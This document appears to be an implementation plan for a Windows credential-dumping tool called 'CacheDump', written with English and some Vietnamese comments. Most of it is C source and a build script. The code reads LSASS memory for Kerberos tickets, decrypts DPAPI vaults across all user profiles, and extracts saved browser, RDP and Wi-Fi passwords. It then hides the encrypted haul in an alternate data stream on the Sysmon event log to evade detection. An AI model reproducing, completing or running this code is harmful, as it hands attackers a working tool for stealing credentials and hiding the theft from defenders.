# Plan 5 — Cached Domain Credentials: Implementation Plan

> **Target**: T1003.005 | **Pre-condition**: SYSTEM | **Focus**: Multi-source cached credential extraction

---

## 0. Project Structure

```
OS_dump/Plan5_Cache/
├── SPEC.md                     ← Technical spec (Plan5_Cache_Dump_SPEC.md)
├── IMPL.md                     ← This file
├── README.md                   ← Setup & run guide
├── build.bat                   ← MSVC build
├── src/
│   ├── main.c                  ← Entry point + orchestrator
│   ├── mscache_v2.c/h          ← MSCache v2 parser (from SECURITY hive)
│   ├── kerberos_cache.c/h      ← LSA Kerberos ticket extractor
│   ├── dpapi_vault.c/h         ← DPAPI Credential Vault decryptor
│   ├── dpapi_masterkey.c/h     ← DPAPI master key decryption
│   ├── browser_creds.c/h       ← Chrome/Edge/Firefox password extractor
│   ├── rdp_creds.c/h           ← RDP saved credentials extractor
│   ├── wifi_profiles.c/h       ← Wi-Fi PSK extractor
│   ├── hive_reader.c/h         ← Raw NTFS hive reader (shared)
│   ├── lsass_reader.c/h        ← LSASS memory reader (shared)
│   ├── ads_writer.c/h          ← AES-256-GCM + ADS output
│   ├── cleanup.c/h             ← Cleanup
│   ├── common.h
│   └── crypto/
│       ├── sha256.c/h
│       ├── aes256_gcm.c/h
│       ├── rc4.c/h
│       └── dpapi.c/h           ← DPAPI-specific crypto (PBKDF2, HMAC-SHA1)
├── test/
│   ├── run_test.ps1
│   ├── verify_cache.py
│   └── detect_check.ps1
└── output/
```

---

## 1. Build

```batch
@echo off
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

set CFLAGS=/nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 ^
           /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE"

cl.exe %CFLAGS% /Fe"CacheDump.exe" ^
    src\main.c src\mscache_v2.c src\kerberos_cache.c ^
    src\dpapi_vault.c src\dpapi_masterkey.c src\browser_creds.c ^
    src\rdp_creds.c src\wifi_profiles.c src\hive_reader.c ^
    src\lsass_reader.c src\ads_writer.c src\cleanup.c ^
    src\crypto\sha256.c src\crypto\aes256_gcm.c ^
    src\crypto\rc4.c src\crypto\dpapi.c ^
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT ^
    kernel32.lib ntdll.lib advapi32.lib crypt32.lib

echo Build complete: CacheDump.exe
```

---

## 2. Core Implementation

### 2.1 main.c — Multi-Source Orchestrator

```c
// main.c — Cached Domain Credential Extraction (Multi-Source)
#include "common.h"

typedef enum {
    SOURCE_MSCACHE = 0,
    SOURCE_KERBEROS,
    SOURCE_DPAPI_VAULT,
    SOURCE_BROWSER,
    SOURCE_RDP,
    SOURCE_WIFI,
    SOURCE_COUNT
} CRED_SOURCE;

static DWORD g_CredCounts[SOURCE_COUNT] = {0};

int DumpAllCache(void) {
    wprintf(L"[*] Plan 5: Multi-Source Cached Credential Dump\n\n");

    // ── Source 1: MSCache v2 (SECURITY Hive) ──
    wprintf(L"[1/6] MSCache v2 (SECURITY\\Cache)...\n");
    g_CredCounts[SOURCE_MSCACHE] = ExtractMSCacheV2();
    wprintf(L"      %d entries\n", g_CredCounts[SOURCE_MSCACHE]);

    // ── Source 2: Kerberos Ticket Cache (LSA Memory) ──
    wprintf(L"[2/6] Kerberos Ticket Cache (LSA Memory)...\n");
    // Attempt LSASS access; gracefully skip if blocked
    if (IsLsassAccessible()) {
        g_CredCounts[SOURCE_KERBEROS] = ExtractKerberosTickets();
        wprintf(L"      %d tickets\n", g_CredCounts[SOURCE_KERBEROS]);
    } else {
        wprintf(L"      SKIPPED (LSASS not accessible)\n");
    }

    // ── Source 3: DPAPI Credential Vault ──
    wprintf(L"[3/6] DPAPI Credential Vault...\n");
    g_CredCounts[SOURCE_DPAPI_VAULT] = ExtractDpapiVault();
    wprintf(L"      %d credentials\n", g_CredCounts[SOURCE_DPAPI_VAULT]);

    // ── Source 4: Browser Saved Passwords ──
    wprintf(L"[4/6] Browser Password Stores...\n");
    g_CredCounts[SOURCE_BROWSER] = ExtractBrowserPasswords();
    wprintf(L"      %d passwords (Chrome/Edge/Firefox)\n",
        g_CredCounts[SOURCE_BROWSER]);

    // ── Source 5: RDP Saved Credentials ──
    wprintf(L"[5/6] RDP Saved Credentials...\n");
    g_CredCounts[SOURCE_RDP] = ExtractRdpCredentials();
    wprintf(L"      %d RDP entries\n", g_CredCounts[SOURCE_RDP]);

    // ── Source 6: Wi-Fi Profiles ──
    wprintf(L"[6/6] Wi-Fi Profiles...\n");
    g_CredCounts[SOURCE_WIFI] = ExtractWifiPasswords();
    wprintf(L"      %d Wi-Fi profiles\n", g_CredCounts[SOURCE_WIFI]);

    // ── Summary + Output ──
    DWORD total = 0;
    for (int i = 0; i < SOURCE_COUNT; i++) total += g_CredCounts[i];

    wprintf(L"\n[+] Total cached credentials extracted: %d\n", total);
    wprintf(L"    MSCache v2:  %d\n", g_CredCounts[SOURCE_MSCACHE]);
    wprintf(L"    Kerberos:    %d\n", g_CredCounts[SOURCE_KERBEROS]);
    wprintf(L"    DPAPI Vault: %d\n", g_CredCounts[SOURCE_DPAPI_VAULT]);
    wprintf(L"    Browser:     %d\n", g_CredCounts[SOURCE_BROWSER]);
    wprintf(L"    RDP:         %d\n", g_CredCounts[SOURCE_RDP]);
    wprintf(L"    Wi-Fi:       %d\n", g_CredCounts[SOURCE_WIFI]);

    // Encrypt + write to ADS
    PBYTE blob; SIZE_T blobSize;
    SerializeAllCredentials(&blob, &blobSize);

    WriteToAds(L"C:\\Windows\\System32\\winevt\\Logs\\"
               L"Microsoft-Windows-Sysmon%4Operational.evtx",
               L"CacheDump",
               blob, blobSize);

    free(blob);
    return 0;
}
```

### 2.2 kerberos_cache.c — LSA Ticket Extraction

```c
// kerberos_cache.c — Extract Kerberos tickets from LSASS memory

#define KERB_TICKET_CACHE_SIGNATURE  0x4B455242  // "KERB"
#define KERB_TGT_SERVER  L"krbtgt"

typedef struct _KERB_TICKET {
    PWSTR   clientName;      // user@REALM
    PWSTR   serverName;      // krbtgt/REALM or service/host
    BYTE    sessionKey[64];
    DWORD   sessionKeyLen;
    DWORD   sessionKeyType;  // 18=AES256, 17=AES128, 23=RC4
    PBYTE   ticketData;      // ASN.1 encoded
    DWORD   ticketLen;
    ULONG64 endTime;         // FILETIME
    DWORD   ticketFlags;
} KERB_TICKET;

DWORD ExtractKerberosTickets(void) {
    DWORD lsassPid = FindLsassPid();
    if (!lsassPid) return 0;

    HANDLE hLsass = OpenLsassHandle(lsassPid, TRUE);
    if (!hLsass) {
        hLsass = OpenLsassViaHandleDup(lsassPid);
    }
    if (!hLsass) return 0;

    // Scan for KERB_TICKET_CACHE_ENTRY structures in kerberos.dll memory
    // Look for the signature pattern near function pointers in LSA heap

    // Enumerate kerberos.dll memory region
    MEMORY_BASIC_INFORMATION mbi = {0};
    ULONG_PTR addr = 0;
    DWORD ticketCount = 0;

    while (TRUE) {
        NTSTATUS st = SysNtQueryVirtualMemory(hLsass, (PVOID)addr,
            MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
        if (!NT_SUCCESS(st)) break;

        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) {
            PBYTE region = (PBYTE)malloc(mbi.RegionSize);
            SIZE_T bytesRead;

            SysNtReadVirtualMemory(hLsass, mbi.BaseAddress,
                region, mbi.RegionSize, &bytesRead);

            // Scan for Kerberos ticket structures
            for (SIZE_T i = 0; i < mbi.RegionSize - 128; i++) {
                // Look for client/server realm names (Unicode, uppercase)
                // Pattern: valid usernames followed by @REALM
                // and service names like "krbtgt/REALM"
                PWSTR candidate = (PWSTR)(region + i);
                if (wcsstr(candidate, L"krbtgt/")) {
                    // Found a potential TGT
                    // Walk backwards to find the structure header
                    // Extract session key, ticket data, flags
                    ticketCount++;
                    i += 256; // Skip past this entry
                }
            }

            free(region);
        }

        addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        if (addr > 0x7FFFFFFFFFFF) break;
    }

    CloseHandle(hLsass);
    return ticketCount;
}
```

### 2.3 dpapi_vault.c — Credential Vault Decryptor

```c
// dpapi_vault.c — DPAPI Credential Vault + Master Key decryption

// DPAPI Master Key structure (Protect\{SID}\{GUID})
typedef struct _DPAPI_MASTERKEY {
    GUID     keyId;
    DWORD    version;
    DWORD    cipherAlgo;      // CALG_AES_256 = 0x00006610
    DWORD    hashAlgo;        // CALG_SHA_512 = 0x0000800E
    PBYTE    salt;            // 16 bytes
    DWORD    saltLen;
    DWORD    rounds;          // PBKDF2 iterations
    PBYTE    encryptedKey;    // Encrypted master key blob
    DWORD    encryptedKeyLen;
    PBYTE    decryptedKey;    // After decryption (64 bytes for SHA-512)
} DPAPI_MASTERKEY;

// DPAPI Credential blob (Credentials\{GUID})
typedef struct _DPAPI_CREDENTIAL {
    GUID     credId;
    DWORD    flags;
    DWORD    size;
    DWORD    algo;
    FILETIME lastWritten;
    PBYTE    blob;            // Encrypted data
    DWORD    blobLen;
    PBYTE    plaintext;       // After decryption
    DWORD    plaintextLen;
} DPAPI_CREDENTIAL;

DWORD ExtractDpapiVault(void) {
    DWORD credCount = 0;

    // 1. Get DPAPI_SYSTEM backup key from LSA Secrets
    BYTE dpapiBackupKey[64] = {0};
    DWORD keyLen = 0;
    if (!GetDpapiSystemKey(dpapiBackupKey, &keyLen)) {
        wprintf(L"      [i] No DPAPI_SYSTEM key available\n");
        return 0;
    }

    // 2. Enumerate all user profiles
    WCHAR profilesPath[MAX_PATH] = L"C:\\Users\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(profilesPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;

        // 3. Read user's DPAPI master key
        WCHAR masterKeyPath[MAX_PATH];
        swprintf(masterKeyPath, MAX_PATH,
            L"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Protect\\*",
            fd.cFileName);

        WIN32_FIND_DATAW mkFd;
        HANDLE hMkFind = FindFirstFileW(masterKeyPath, &mkFd);
        if (hMkFind == INVALID_HANDLE_VALUE) continue;

        // Find user's SID directory
        WCHAR sidPath[MAX_PATH];
        do {
            if (mkFd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
                wcscmp(mkFd.cFileName, L".") != 0 &&
                wcscmp(mkFd.cFileName, L"..") != 0) {
                swprintf(sidPath, MAX_PATH,
                    L"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Protect\\%s",
                    fd.cFileName, mkFd.cFileName);
                break;
            }
        } while (FindNextFileW(hMkFind, &mkFd));
        FindClose(hMkFind);

        if (wcslen(sidPath) == 0) continue;

        // 4. Load + decrypt master keys
        DPAPI_MASTERKEY* keys = NULL;
        DWORD keyCount = LoadMasterKeys(sidPath, &keys);
        for (DWORD k = 0; k < keyCount; k++) {
            DecryptMasterKey(&keys[k], dpapiBackupKey, keyLen);
        }

        // 5. Load + decrypt credential blobs
        WCHAR credPath[MAX_PATH];
        swprintf(credPath, MAX_PATH,
            L"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Credentials\\*",
            fd.cFileName);

        WIN32_FIND_DATAW credFd;
        HANDLE hCredFind = FindFirstFileW(credPath, &credFd);
        if (hCredFind != INVALID_HANDLE_VALUE) {
            do {
                WCHAR fullCredPath[MAX_PATH];
                swprintf(fullCredPath, MAX_PATH,
                    L"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Credentials\\%s",
                    fd.cFileName, credFd.cFileName);

                DPAPI_CREDENTIAL cred = {0};
                if (LoadCredentialBlob(fullCredPath, &cred)) {
                    if (DecryptCredentialBlob(&cred, keys, keyCount)) {
                        credCount++;
                        SaveCredentialToOutput(&cred, fd.cFileName);
                    }
                }
            } while (FindNextFileW(hCredFind, &credFd));
            FindClose(hCredFind);
        }

        for (DWORD k = 0; k < keyCount; k++) {
            free(keys[k].salt);
            free(keys[k].encryptedKey);
            free(keys[k].decryptedKey);
        }
        free(keys);

    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    return credCount;
}
```

### 2.4 browser_creds.c — Browser Password Extraction

```c
// browser_creds.c — Chrome/Edge/Firefox saved password extraction

DWORD ExtractBrowserPasswords(void) {
    DWORD totalCount = 0;

    // Chrome / Edge (Chromium-based) — SQLite Login Data
    // Path: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
    //       %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

    WCHAR* chromePaths[] = {
        L"Google\\Chrome\\User Data\\Default\\Login Data",
        L"Microsoft\\Edge\\User Data\\Default\\Login Data",
        L"BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
        L"Opera Software\\Opera Stable\\Login Data",
        NULL
    };

    // Enumerate all user profiles for Chrome/Edge
    WCHAR localAppData[MAX_PATH];
    // Get all user profile directories
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(L"C:\\Users\\*", &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == L'.') continue;

        // For each browser
        for (int b = 0; chromePaths[b] != NULL; b++) {
            WCHAR dbPath[MAX_PATH];
            swprintf(dbPath, MAX_PATH,
                L"C:\\Users\\%s\\AppData\\Local\\%s",
                fd.cFileName, chromePaths[b]);

            // Copy SQLite DB to memory (avoid file lock issues)
            HANDLE hFile = CreateFileW(dbPath, GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) continue;

            DWORD size = GetFileSize(hFile, NULL);
            if (size > 0 && size < 10 * 1024 * 1024) { // Max 10MB
                PBYTE dbData = (PBYTE)malloc(size);
                DWORD read;
                ReadFile(hFile, dbData, size, &read, NULL);

                // Parse SQLite format (simplified):
                // Table: logins
                // Columns: origin_url, username_value, password_value (blob)
                // password_value is DPAPI-encrypted (AES-256-GCM)

                // Walk SQLite pages → find logins table → extract rows
                DWORD entries = ParseChromeLoginData(dbData, size, fd.cFileName);
                totalCount += entries;
                free(dbData);
            }
            CloseHandle(hFile);
        }

        // Firefox — key4.db + logins.json
        WCHAR ffPath[MAX_PATH];
        swprintf(ffPath, MAX_PATH,
            L"C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*",
            fd.cFileName);

        WIN32_FIND_DATAW ffFd;
        HANDLE hFfFind = FindFirstFileW(ffPath, &ffFd);
        if (hFfFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(ffFd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                if (ffFd.cFileName[0] == L'.') continue;

                WCHAR loginsPath[MAX_PATH], keyPath[MAX_PATH];
                swprintf(loginsPath, MAX_PATH,
                    L"C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\"
                    L"Profiles\\%s\\logins.json",
                    fd.cFileName, ffFd.cFileName);
                swprintf(keyPath, MAX_PATH,
                    L"C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\"
                    L"Profiles\\%s\\key4.db",
                    fd.cFileName, ffFd.cFileName);

                // Parse logins.json + key4.db → decrypt Firefox saved passwords
                DWORD ffEntries = ParseFirefoxLogins(loginsPath, keyPath);
                totalCount += ffEntries;
                break; // Chỉ xử lý profile đầu tiên (mặc định)
            } while (FindNextFileW(hFfFind, &ffFd));
            FindClose(hFfFind);
        }

    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    return totalCount;
}
```

### 2.5 rdp_creds.c — RDP Saved Credentials

```c
// rdp_creds.c — Extract saved RDP credentials from registry + Credential Manager

DWORD ExtractRdpCredentials(void) {
    DWORD credCount = 0;

    // Source 1: RDP connection history (registry)
    // HKCU\Software\Microsoft\Terminal Server Client\Servers\{hostname}
    // Values: UsernameHint (REG_SZ)

    WCHAR* profiles[] = {
        L".DEFAULT",
        NULL
    };
    // Actually need to enumerate all user SIDs in HKEY_USERS

    // Source 2: Credential Manager (TERMSRV/*)
    // cmdkey /list → TERMSRV/{hostname}
    // Can be enumerated via CredEnumerateW API

    DWORD count = 0;
    PCREDENTIALW* creds = NULL;
    if (CredEnumerateW(L"TERMSRV/*", 0, &count, &creds)) {
        for (DWORD i = 0; i < count; i++) {
            if (creds[i]->Type == CRED_TYPE_DOMAIN_PASSWORD ||
                creds[i]->Type == CRED_TYPE_GENERIC) {

                // creds[i]->TargetName = "TERMSRV/hostname"
                // creds[i]->UserName = stored username
                // creds[i]->CredentialBlob = encrypted password

                // Decrypt via CryptUnprotectData (needs user context)
                // Or use offline DPAPI approach (dpapi_vault.c)
                credCount++;
            }
        }
        CredFree(creds);
    }

    return credCount;
}
```

---

## 3. Data Aggregation & Output

```c
// Output JSON structure
/*
{
  "source": "cache_dump_v1",
  "timestamp": "2026-08-03T12:00:00Z",
  "machine": "WS01",
  "domain": "testlab.local",
  "credentials": {
    "mscache_v2": [
      {"username": "admin", "domain": "testlab",
       "hash": "$DCC2$10240#admin#testlab#AABBCCDD..."}
    ],
    "kerberos_tickets": [
      {"client": "admin@TESTLAB.LOCAL", "server": "krbtgt/TESTLAB.LOCAL",
       "key_type": 18, "end_time": "2026-08-04T08:00:00Z"}
    ],
    "dpapi_vault": [
      {"source": "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Credentials\\...",
       "type": "domain_password", "target": "TERMSRV/DC01",
       "username": "testlab\\admin", "password": "PlaintextPassword123!"}
    ],
    "browser_passwords": [
      {"browser": "Chrome", "url": "https://example.com/login",
       "username": "admin@testlab.local", "password": "WebPassword456!"}
    ],
    "rdp_connections": [
      {"host": "DC01.testlab.local", "username": "testlab\\admin"}
    ],
    "wifi_profiles": [
      {"ssid": "CORP-WiFi", "auth": "WPA2-PSK",
       "password": "CorpWifiKey789!"}
    ]
  }
}
*/
```

---

## 4. Key Technical Notes

### Multi-User Profile Enumeration
- Walk `C:\Users\*` để tìm tất cả user profiles
- Mỗi profile có DPAPI vault riêng (`%APPDATA%\Microsoft\Credentials`)
- SYSTEM có thể đọc tất cả profiles nhưng decrypt cần DPAPI_SYSTEM key

### DPAPI Decryption Chain
```
Master Key (encrypted with user password)
    → DPAPI_SYSTEM backup key decrypts master key
        → Master key decrypts credential blobs
            → Credential blobs reveal plaintext passwords
```

### Browser Password Decryption
- Chrome/Edge: password_value → AES-256-GCM → decrypt với DPAPI
- Firefox: key4.db → 3DES → decrypt logins.json entries
- Tất cả đều phụ thuộc DPAPI → cần user context hoặc backup key

### Security Considerations
- Browser passwords yêu cầu decrypt trong user context (CryptUnprotectData)
- DPAPI_SYSTEM backup key từ LSA Secrets cho phép offline decrypt
- RDP credentials trong Credential Manager có thể decrypt offline
- Kerberos tickets có thời hạn (TGT thường 10h) → chỉ hữu ích trong window còn valid
